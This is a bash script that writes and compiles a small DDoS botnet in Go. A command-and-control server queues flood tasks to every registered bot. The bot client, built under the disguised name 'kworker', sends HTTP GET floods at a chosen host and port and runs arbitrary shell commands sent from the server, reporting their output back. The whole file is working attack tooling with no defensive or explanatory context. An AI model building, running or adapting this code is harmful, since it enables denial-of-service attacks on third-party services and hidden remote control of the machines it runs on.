#!/bin/bash
mkdir -p ~/ddos && cd ~/ddos
cat > c2.go <<'GOEOF'
package main
import ("encoding/json";"fmt";"net/http";"sync";"time")
type Task struct{ID string `json:"id"`;Type string `json:"type"`;Host string `json:"host"`;Port int `json:"port"`;Work int `json:"workers"`;Secs int `json:"secs"`}
type Bot struct{ID string `json:"id"`;LastSeen time.Time `json:"last_seen"`;Queue []Task `json:"-"`}
var(mu sync.Mutex;bots=map[string]*Bot{})
func main(){
http.HandleFunc("/reg",func(w http.ResponseWriter,r *http.Request){var b Bot;json.NewDecoder(r.Body).Decode(&b);mu.Lock();if _,ok:=bots[b.ID];!ok{bots[b.ID]=&Bot{ID:b.ID}};bots[b.ID].LastSeen=time.Now();var out Task;if len(bots[b.ID].Queue)>0{out=bots[b.ID].Queue[0];bots[b.ID].Queue=bots[b.ID].Queue[1:]};mu.Unlock();json.NewEncoder(w).Encode(out)})
http.HandleFunc("/fire",func(w http.ResponseWriter,r *http.Request){var t Task;json.NewDecoder(r.Body).Decode(&t);t.ID=fmt.Sprint(time.Now().UnixNano());t.Type="flood";mu.Lock();for _,b:=range bots{b.Queue=append(b.Queue,t)};n:=len(bots);mu.Unlock();fmt.Fprintf(w,"queued %d bots\n",n)})
fmt.Println("C2 on :8443");http.ListenAndServe(":8443",nil)}
GOEOF
cat > bot.go <<'GOEOF'
package main
import ("bytes";"encoding/json";"fmt";"io";"math/rand";"net";"net/http";"os";"os/exec";"runtime";"strings";"sync";"sync/atomic";"time")
type Task struct{ID string `json:"id"`;Type string `json:"type"`;Host string `json:"host"`;Port int `json:"port"`;Work int `json:"workers"`;CMD string `json:"cmd"`;Secs int `json:"secs"`}
var(server="http://127.0.0.1:8443";id=fmt.Sprintf("%s-%d",hn(),os.Getpid());backoff int32;client=&http.Client{Timeout:15*time.Second})
func hn()string{h,_:=os.Hostname();return h}
func main(){for{if atomic.LoadInt32(&backoff)==1{time.Sleep(5*time.Second);continue};b,_:=json.Marshal(map[string]string{"id":id,"os":runtime.GOOS});resp,err:=client.Post(server+"/reg","application/json",bytes.NewReader(b));if err!=nil{time.Sleep(10*time.Second);continue};body,_:=io.ReadAll(resp.Body);resp.Body.Close();if len(body)>2{var t Task;if json.Unmarshal(body,&t)==nil&&t.ID!=""{go run(t)}};time.Sleep(5*time.Second)}}
func run(t Task){if t.Type=="flood"{flood(t.Host,t.Port,t.Work,t.Secs)}else if t.Type=="shell"{out,_:=exec.Command("sh","-c",t.CMD).CombinedOutput();b,_:=json.Marshal(map[string]string{"task":t.ID,"out":string(out)});client.Post(server+"/report","application/json",bytes.NewReader(b))}}
var ua=[]string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0","Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"}
func flood(h string,p,w,s int){addr:=fmt.Sprintf("%s:%d",h,p);dl:=time.Now().Add(time.Duration(s)*time.Second);var wg sync.WaitGroup;for i:=0;i<w;i++{wg.Add(1);go func(){defer wg.Done();for time.Now().Before(dl)&&atomic.LoadInt32(&backoff)==0{d:=net.Dialer{Timeout:4*time.Second};c,e:=d.Dial("tcp",addr);if e!=nil{time.Sleep(50*time.Millisecond);continue};req:=fmt.Sprintf("GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",rand.Intn(99999),strings.Split(addr,":")[0],ua[rand.Intn(len(ua))]);c.Write([]byte(req));c.Close()}}()};wg.Wait()}
GOEOF
go build -ldflags "-s -w" -o c2 c2.go
go build -ldflags "-s -w" -o kworker bot.go
echo "BUILD DONE! Run: cd ~/ddos && ./c2"
